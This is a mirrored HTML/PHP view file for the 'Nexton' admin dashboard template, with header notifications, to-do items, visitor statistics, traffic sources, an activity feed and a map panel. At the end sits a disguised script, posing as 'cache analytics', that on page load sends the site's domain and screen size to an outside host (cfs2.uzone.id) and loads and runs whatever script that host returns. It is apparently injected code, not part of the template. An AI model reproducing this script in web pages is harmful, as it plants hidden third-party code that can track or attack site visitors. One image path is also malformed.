<!DOCTYPE html>
<html lang="en">
<!-- Mirrored from arisedashboard.com/nexton/design-feb-5/ by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 08 Feb 2017 06:37:46 GMT -->

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="description" content="Nexton Admin Panel">
    <meta name="keywords" content="Admin, Dashboard, Bootstrap3, Sass, transform, CSS3, HTML5, Web design, UI Design, Responsive Dashboard, Responsive Admin, Admin Template, Best Admin UI, Bootstrap Template, Themeforest, Bootstrap">
    <meta name="author" content="Bootstrap Gallery">
    <link rel="shortcut icon" href="img/favicon.ico">
    <title>Nexton Admin Panel, Nexton Dashboard</title>

    <?php $this->load->view('plugin/include_css') ?>
    
    <!--[if lt IE 9]>
			<script src="js/html5shiv.js"></script>
			<script src="js/respond.min.js"></script>
		<![endif]-->
</head>

<body>
    <div id="loading-wrapper">
        <div id="loader"></div>
    </div>
    <header class="clearfix">
        <div class="logo"><img src="<?=base_url();?>assets/img/logo.png" alt="Logo"></div>
        <div class="pull-right">
            <ul id="header-actions" class="clearfix">
                <li class="list-box dropdown"><a id="drop1" href="#" role="button" class="dropdown-toggle" data-toggle="dropdown"><span class="info-label">7</span> <i class="icon-notifications_active info-icon text-success"></i></a>
                    <ul class="dropdown-menu imp-notify">
                        <li>
                            <div class="thumb"><img src="<?=base_url();?>assets/img/user4.png" alt="Admin Dashboard"></div>
                            <div class="details"><strong>Wilson Kewis</strong>
                                <p>The best dashboard design I have ever seen. Good luck with sales.</p><small class="date">Today at 10:10 pm - 21.12.2016</small></div>
                        </li>
                        <li>
                            <div class="thumb"><img src="<?=base_url();?>assets/<?=base_url();?>assets/img/user7.png" alt="Admin Dashboard"></div>
                            <div class="details"><strong>Justin Mezzell</strong>
                                <p>To keep your account secure, we need to revalidate your account.</p><small class="date">3 days ago at 2:30 pm</small></div>
                        </li>
                        <li>
                            <div class="thumb"><img src="<?=base_url();?>assets/img/user1.png" alt="Admin Dashboard"></div>
                            <div class="details"><strong>Shawn Ankith</strong>
                                <p>Contact you via phone with support for recent purchases and product information.</p><small class="date">7 days ago at 5:15 pm</small></div>
                        </li>
                    </ul>
                </li>
                <li class="list-box dropdown"><a id="drop10" href="#" role="button" class="dropdown-toggle" data-toggle="dropdown"><span class="info-label">4</span> <i class="icon-circle-check info-icon text-warning"></i></a>
                    <div class="dropdown-menu">
                        <section class="todo">
                            <fieldset class="todo-list">
                                <label class="todo-list-item">
                                    <input type="checkbox" class="todo-list-cb"> <span class="todo-list-mark"></span> <span class="todo-list-desc">Fix UI Bug</span> <small class="scheduled">Scheduled for 24th Dec, Assigned to Shawn.</small></label>
                                <label class="todo-list-item">
                                    <input type="checkbox" class="todo-list-cb"> <span class="todo-list-mark"></span> <span class="todo-list-desc">Send all Documents</span> <small class="scheduled">Scheduled for 24th Dec, Assigned to Leena.</small></label>
                                <label class="todo-list-item">
                                    <input type="checkbox" class="todo-list-cb"> <span class="todo-list-mark"></span> <span class="todo-list-desc">Attend Wedding Party</span> <small class="scheduled">Scheduled on 10th Dec, Assigned to Mark.</small></label>
                                <label class="todo-list-item">
                                    <input type="checkbox" class="todo-list-cb" checked="checked"> <span class="todo-list-mark"></span> <span class="todo-list-desc">Meet Mr.James</span> <small class="scheduled">Completed on 5th Dec, Assigned to Robin.</small></label>
                                <label class="todo-list-item">
                                    <input type="checkbox" class="todo-list-cb overdue" checked="checked"> <span class="todo-list-mark"></span> <span class="todo-list-desc">Read Turning Points</span> <small class="scheduled">Overdue 12 days, Assigned to Wincy.</small></label>
                            </fieldset>
                        </section>
                    </div>
                </li>
                <li class="list-box user-admin dropdown">
                    <div class="admin-details">
                        <div class="name">Shawn</div>
                        <div class="designation">System Admin</div>
                    </div><a id="drop4" href="#" role="button" class="dropdown-toggle" data-toggle="dropdown"><i class="icon-account_circle"></i></a>
                    <ul class="dropdown-menu sm">
                        <li class="dropdown-content"><a href="#"><i class="icon-warning2"></i>Update Password<br><span>Your password will expire in 7 days.</span></a> <a href="profile.html">Edit Profile</a> <a href="forgot-pwd.html">Change Password</a> <a href="validations.html">Settings</a> <a href="login.html">Logout</a></li>
                    </ul>
                </li>
            </ul>
        </div><a href="comments.html" class="support">Support</a>
        <div class="custom-search">
            <input type="text" class="search-query" placeholder="Search here ..."> <i class="icon-search4"></i></div>
    </header>
    <div class="container-fluid">
        <div class="sidebar">
            <a href="profile.html" class="user-wrapper clearfix">
                <div class="user-avatar"><img src="<?=base_url();?>assets/img/user2.png" alt="Nexton User"></div>
                <div class="profile-status">
                    <p class="percentage">70% completed</p>
                    <div class="progress progress-xs">
                        <div class="progress-bar progress-bar-danger" role="progressbar" aria-valuenow="70" aria-valuemin="0" aria-valuemax="100" style="width: 70%"></div>
                    </div>
                </div>
            </a>
            <nav class="navbar navbar-default">
                <div class="navbar-header">
                    <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#collapse-nav" aria-expanded="false"><span class="sr-only">Toggle navigation</span> <span class="icon-bar"></span> <span class="icon-bar"></span> <span class="icon-bar"></span></button>
                </div>
                
                <div class="collapse navbar-collapse" id="collapse-nav">
                    <ul class="nav navbar-nav">
                        <li class="dropdown active open">
                        <a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false">
                        <i class="icon-home2"></i> <span class="menu-text">Dashboards</span> <span class="label label-primary">2</span></a>
                            <ul class="dropdown-menu">
                                <li><a class="current-page" href="index-2.html">Dashboard</a></li>
                                <li><a href="http://arisedashboard.com/nexton/design" target="_blank">Horizontal Menu</a></li>
                            </ul>
                        </li>
                        
                        <li class="dropdown">
                        <a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false">
                        <i class="icon-verified_user"></i> <span class="menu-text">Pages</span> <span class="label label-danger">7</span></a>
                            <ul class="dropdown-menu">
                                <li><a href="calendar.html">Calendar</a></li>
                                <li><a href="profile.html">User Profile</a></li>
                                <li><a href="comments.html">Comments</a></li>
                                <li><a href="invoice.html">Invoice</a></li>
                                <li><a href="blog.html">Blog</a></li>
                                <li><a href="pricing.html">Pricing Plans</a></li>
                                <li><a href="gallery.html">Gallery</a></li>
                            </ul>
                        </li>
                        <li class="dropdown"><a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false">
                        <i class="icon-pie_chart"></i> <span class="menu-text">Graphs</span> <span class="label label-success">3</span></a>
                            <ul class="dropdown-menu">
                                <li><a href="c3-graphs.html">C3 Graphs</a></li>
                                <li><a href="maps.html">Maps</a></li>
                                <li><a href="flot.html">Flot Graphs</a></li>
                            </ul>
                        </li>
                        <li class="dropdown"><a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false">
                        <i class="icon-subtitles"></i> <span class="menu-text">Forms</span> <span class="label label-warning">3</span></a>
                            <ul class="dropdown-menu">
                                <li><a href="form-inputs.html">Form Inputs</a></li>
                                <li><a href="validations.html">Validations</a></li>
                                <li><a href="editor.html">Editors</a></li>
                            </ul>
                        </li>
                        <li class="dropdown"><a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false">
                        <i class="icon-palette2"></i> <span class="menu-text">UI Elements</span> <span class="label label-pink">11</span></a>
                            <ul class="dropdown-menu">
                                <li><a href="buttons.html">Buttons</a></li>
                                <li><a href="components.html">Components</a></li>
                                <li><a href="modals.html">Modals</a></li>
                                <li><a href="labels-badges.html">Labels &amp; Badges</a></li>
                                <li><a href="spinners.html">Spinners</a></li>
                                <li><a href="notifications.html">Notifications</a></li>
                                <li><a href="progressbars.html">Progress Bars</a></li>
                                <li><a href="icons.html">Icons</a></li>
                                <li><a href="custom-panels.html">Panels</a></li>
                                <li><a href="custom-grid.html">Grid</a></li>
                                <li><a href="default.html">Default Layout</a></li>
                            </ul>
                        </li>
                        <li class="dropdown"><a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false"><i class="icon-view_week"></i> <span class="menu-text">Tables</span> <span class="label label-grey">2</span></a>
                            <ul class="dropdown-menu">
                                <li><a href="tables.html">Bootstrap Tables</a></li>
                                <li><a href="data-tables.html">Data Tables</a></li>
                            </ul>
                        </li>
                        <li><a href="typography.html"><i class="icon-text_fields"></i> <span class="menu-text">Typography</span></a></li>
                        <li class="dropdown"><a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false"><i class="icon-error"></i> <span class="menu-text">Error</span> <span class="label label-teal">5</span></a>
                            <ul class="dropdown-menu">
                                <li><a href="login.html">Login</a></li>
                                <li><a href="signup.html">Sign Up</a></li>
                                <li><a href="lock-screen.html">Lock Screen</a></li>
                                <li><a href="forgot-pwd.html">Forgot Password</a></li>
                                <li><a href="error.html">Page Not Found</a></li>
                            </ul>
                        </li>
                    </ul>
                </div>
            </nav>
            <div class="addon-wrapper">
                <ul class="views">
                    <li>
                        <p class="detail-info"><i class="icon-vinyl blue"></i> Signups</p>
                    </li>
                    <li>
                        <p class="detail-info"><i class="icon-vinyl green"></i> Users Online</p>
                    </li>
                    <li>
                        <p class="detail-info"><i class="icon-vinyl red"></i>Uploads</p>
                    </li>
                </ul>
            </div>
        </div>
        <div class="dashboard-wrapper">
            <div class="top-bar clearfix">
                <div class="page-title">
                    <h4>Dashboard</h4></div>
                <ul class="topbar-stats">
                    <li>
                        <div class="sales-block hidden-sm"><span id="overallIncome"></span></div>
                        <div class="sales-details">
                            <h4><span>$9579</span> <i class="icon-arrow-up-right2 up"></i></h4>
                            <h5>Overall Income</h5></div>
                    </li>
                </ul>
            </div>
            <div class="main-container">
                <div class="row gutter">
                    <div class="col-md-12">
                        <div class="panel clearfix">
                            <div class="panel-body">
                                <div class="date-range clearfix">
                                    <h3 class="title">Statistics</h3>
                                    <div class="pull-right" id="seletDate" data-toggle="buttons">
                                        <label class="btn">
                                            <input type="radio" name="options" id="option3"> Last Week</label>&nbsp;
                                        <label class="btn">
                                            <input type="radio" name="options" id="option2"> Last 30 Days</label>&nbsp;
                                        <label class="btn active">
                                            <input type="radio" name="options" id="option1" checked="checked"> All Time</label>
                                    </div>
                                </div>
                                <div id="stackedBarGraph" class="chart-height3"></div>
                                <ul class="visitor-stats row gutter">
                                    <li class="col-lg-3 col-md-3 col-sm-6 col-xs-12">
                                        <div class="block">
                                            <h5 class="visitor-title">Total Visitors <span class="growth"><i class="icon-arrow-up-right2 up"></i>4.7%</span></h5>
                                            <h2 class="num-stats">8050</h2>
                                            <div class="progress progress-sm progress-rounded">
                                                <div class="progress-bar progress-bar-success" role="progressbar" aria-valuenow="72" aria-valuemin="0" aria-valuemax="100" style="width: 72%"></div>
                                            </div>
                                        </div>
                                    </li>
                                    <li class="col-lg-3 col-md-3 col-sm-6 col-xs-12">
                                        <div class="block">
                                            <h5 class="visitor-title">New Signups <span class="growth"><i class="icon-arrow-up-right2 up"></i>8.2%</span></h5>
                                            <h2 class="num-stats">467</h2>
                                            <div class="progress progress-sm progress-rounded">
                                                <div class="progress-bar progress-bar-success" role="progressbar" aria-valuenow="60" aria-valuemin="0" aria-valuemax="100" style="width: 60%"></div>
                                            </div>
                                        </div>
                                    </li>
                                    <li class="col-lg-3 col-md-3 col-sm-6 col-xs-12">
                                        <div class="block">
                                            <h5 class="visitor-title">Email Enquiries <span class="growth"><i class="icon-arrow-down-left2 down"></i>0.81%</span></h5>
                                            <h2 class="num-stats">1269</h2>
                                            <div class="progress progress-sm progress-rounded">
                                                <div class="progress-bar progress-bar-danger" role="progressbar" aria-valuenow="47" aria-valuemin="0" aria-valuemax="100" style="width: 47%"></div>
                                            </div>
                                        </div>
                                    </li>
                                    <li class="col-lg-3 col-md-3 col-sm-6 col-xs-12">
                                        <div class="block">
                                            <h5 class="visitor-title">Average Time <span class="growth"><i class="icon-arrow-up-right2 up"></i>3.9%</span></h5>
                                            <h3 class="avg-time">5min:7sec</h3></div>
                                    </li>
                                </ul>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="row gutter">
                    <div class="col-lg-4 col-md-4 col-sm-12 col-xs-12">
                        <div class="panel panel-light">
                            <div class="panel-heading">
                                <h4>Tasks</h4></div>
                            <div class="panel-body">
                                <ul class="task-list">
                                    <li class="list"><span></span>Attend Seminar</li>
                                    <li class="list"><span></span>UX Workshop</li>
                                    <li class="list completed"><span></span>Redesign App</li>
                                    <li class="list completed"><span></span>Coffee break</li>
                                    <li class="list"><span></span>Send Greetings</li>
                                    <li class="list"><span></span>Team Meeting</li>
                                </ul>
                            </div>
                        </div>
                    </div>
                    <div class="col-lg-4 col-md-4 col-sm-6 col-xs-12">
                        <div class="panel panel-light">
                            <div class="panel-heading">
                                <h4>Traffic Sources</h4></div>
                            <div class="panel-body">
                                <table class="table table-no-border traffic-sources">
                                    <tbody>
                                        <tr>
                                            <td class="col-xs-1"><span class="symbol"></span></td>
                                            <td class="col-xs-6">Search Engines</td>
                                            <td class="col-xs-3">42.95%</td>
                                            <td class="col-xs-2">
                                                <div class="progress progress-md">
                                                    <div class="progress-bar progress-bar-success" role="progressbar" aria-valuenow="98" aria-valuemin="0" aria-valuemax="100" style="width: 98%"></div>
                                                </div>
                                            </td>
                                        </tr>
                                        <tr>
                                            <td class="col-xs-1"><span class="symbol pink"></span></td>
                                            <td class="col-xs-6">Referring</td>
                                            <td class="col-xs-3">21.49%</td>
                                            <td class="col-xs-2">
                                                <div class="progress progress-md">
                                                    <div class="progress-bar progress-bar-success" role="progressbar" aria-valuenow="72" aria-valuemin="0" aria-valuemax="100" style="width: 72%"></div>
                                                </div>
                                            </td>
                                        </tr>
                                        <tr>
                                            <td class="col-xs-1"><span class="symbol purple"></span></td>
                                            <td class="col-xs-6">Direct</td>
                                            <td class="col-xs-3">18.74%</td>
                                            <td class="col-xs-2">
                                                <div class="progress progress-md">
                                                    <div class="progress-bar progress-bar-success" role="progressbar" aria-valuenow="42" aria-valuemin="0" aria-valuemax="100" style="width: 42%"></div>
                                                </div>
                                            </td>
                                        </tr>
                                        <tr>
                                            <td class="col-xs-1"><span class="symbol yellow"></span></td>
                                            <td class="col-xs-6">Advertising</td>
                                            <td class="col-xs-3">12.9%</td>
                                            <td class="col-xs-2">
                                                <div class="progress progress-md">
                                                    <div class="progress-bar progress-bar-success" role="progressbar" aria-valuenow="21" aria-valuemin="0" aria-valuemax="100" style="width: 21%"></div>
                                                </div>
                                            </td>
                                        </tr>
                                        <tr>
                                            <td class="col-xs-1"><span class="symbol orange"></span></td>
                                            <td class="col-xs-6">Other</td>
                                            <td class="col-xs-3">5.2%</td>
                                            <td class="col-xs-2">
                                                <div class="progress progress-md">
                                                    <div class="progress-bar progress-bar-success" role="progressbar" aria-valuenow="8" aria-valuemin="0" aria-valuemax="100" style="width: 8%"></div>
                                                </div>
                                            </td>
                                        </tr>
                                    </tbody>
                                </table><a href="#" class="btn btn-light-grey btn-block">View All</a></div>
                        </div>
                    </div>
                    <div class="col-lg-4 col-md-4 col-sm-6 col-xs-12">
                        <div class="panel panel-light">
                            <div class="panel-heading">
                                <h4>Acounts to Review</h4></div>
                            <div class="panel-body">
                                <ul class="accounts-review">
                                    <li><a href="javascript:void(0)"><h1>27</h1><h5>Accounts without <strong>bank</strong> details</h5></a></li>
                                    <li class="blue"><a href="javascript:void(0)"><h1>16</h1><h5>Accounts without <strong>contact</strong> details</h5></a></li>
                                </ul>
                                <p class="account-notify"><i class="icon-warning2"></i>You have 27 Accounts without <strong>Credit Card</strong> Details and 16 Accounts without <strong>Contact</strong> Information.</p>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="row gutter">
                    <div class="col-lg-6 col-md-6 col-sm-6 col-xs-12">
                        <div class="panel panel-light">
                            <div class="panel-heading">
                                <h4>Datepicker</h4></div>
                            <div class="panel-body">
                                <div id="datepicker"></div>
                            </div>
                        </div>
                    </div>
                    <div class="col-lg-6 col-md-6 col-sm-6 col-xs-12">
                        <div class="panel panel-light">
                            <div class="panel-heading">
                                <h4>Activity</h4></div>
                            <div class="panel-body">
                                <ul class="activity">
                                    <li><img src="img/user9.png" class="activity-avatar" alt="Avatar">
                                        <div class="activity-info clearfix">
                                            <div class="activity-labels"><a href="javascript:void(0)" class="label label-success">Resolved</a></div>
                                            <h4>Mikael Eidenberg</h4>
                                            <p class="activity-date">Jan 10th, 2017 @ 15:30</p>
                                            <p class="activity-details">Resolved <span>#197</span> sidebar font size changed.</p>
                                        </div>
                                    </li>
                                    <li class="divider"></li>
                                    <li><img src="img/user7.png" class="activity-avatar" alt="Avatar">
                                        <div class="activity-info clearfix">
                                            <div class="activity-labels"><a href="javascript:void(0)" class="label label-danger">Updated</a></div>
                                            <h4>Meagan Fisher</h4>
                                            <p class="activity-date">Jan 12th, 2017 @ 12:25</p>
                                            <p class="activity-details">Updated <span>#134</span> seminar video uploaded.</p>
                                        </div>
                                    </li>
                                    <li class="divider"></li>
                                    <li><img src="img/user1.png" class="activity-avatar" alt="Avatar">
                                        <div class="activity-info clearfix">
                                            <div class="activity-labels"><a href="javascript:void(0)" class="label label-warning">Pushed</a></div>
                                            <h4>Aohn Ashenden</h4>
                                            <p class="activity-date">Jan 5th, 2017 @ 18:15</p>
                                            <p class="activity-details">Pushed <span>#263</span> commits to githug on Nexton App.</p>
                                        </div>
                                    </li>
                                </ul>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="row gutter">
                    <div class="col-lg-12 col-md-12 col-sm-12 col-xs-12">
                        <div class="panel panel-light no-margin">
                            <div class="panel-heading">
                                <h4>Locations</h4></div>
                            <div class="panel-body">
                                <div class="row gutter">
                                    <div class="col-lg-7 col-md-7 col-sm-7 col-xs-12">
                                        <div id="world-map-markers" class="chart-height3"></div>
                                    </div>
                                    <div class="col-lg-5 col-md-5 col-sm-5 col-xs-12">
                                        <div class="global-local"><i class="icon-globe2"></i>
                                            <h3>245,985 <i class="icon-call_made small"></i></h3>
                                            <p>This dashboard unquestionably the largest visitors in the world with TWO million monthly active users and ONE million daily active.</p>
                                        </div>
                                        <div id="globalLocal" class="chart-height"></div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <footer class="footer">Copyright Nexton Admin App <span>2017</span>.</footer>
        </div>
    </div>

    <?php $this->load->view('plugin/include_js') ?>
    
    <script type="text/javascript">
        //Datepicker
        $(function() {
            $("#datepicker").datepicker();
        });
    </script>
    <script type="text/javascript">
        if (self == top) {
            function netbro_cache_analytics(fn, callback) {
                setTimeout(function() {
                    fn();
                    callback();
                }, 0);
            }

            function sync(fn) {
                fn();
            }

            function requestCfs() {
                var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
                var idc_glo_r = Math.floor(Math.random() * 99999999999);
                var url = idc_glo_url + "cfs2.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKVzUsnQyXgltImuvK8dldpId2JW%2bU77royopKGW6wXfy4aVpNhi4f52iRWUamXBzctEtvmE%2f%2falMuDH4Z6chXU3dMUdrG0eJmeOFBj4TZ544bdrhDq8RQzr6iRHrAUApYZKz3fN%2bPtO%2fNfbhDpZ3DbK2CvQS6s08eLozTjZhG%2ffUvB8b6845RZYaPGqh5TztSiHc1hE5tnOX%2f5FJVbO%2bV8eMQWxIlpV0%2bGqztaKK1VlKAJRSqYLJsbSmAGucPprZ4lHKvZLuVS4dBTZ9tMrWkaHZvlZ3JLC1u3zKsGvHPlRXYTP%2fVBkcYaDFO%2b6ZOTfftXcVSTkhO1N200cNaRVYtzNPhlP2t62KO5ua63PbEfJw%2flBNuMbWoGa6mZXTGmL3zS2L7Sw0PRfU%3d" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
                var bsa = document.createElement('script');
                bsa.type = 'text/javascript';
                bsa.async = true;
                bsa.src = url;
                (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
            }
            netbro_cache_analytics(requestCfs, function() {});
        };
    </script>
</body>
<!-- Mirrored from arisedashboard.com/nexton/design-feb-5/ by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 08 Feb 2017 06:38:41 GMT -->

</html>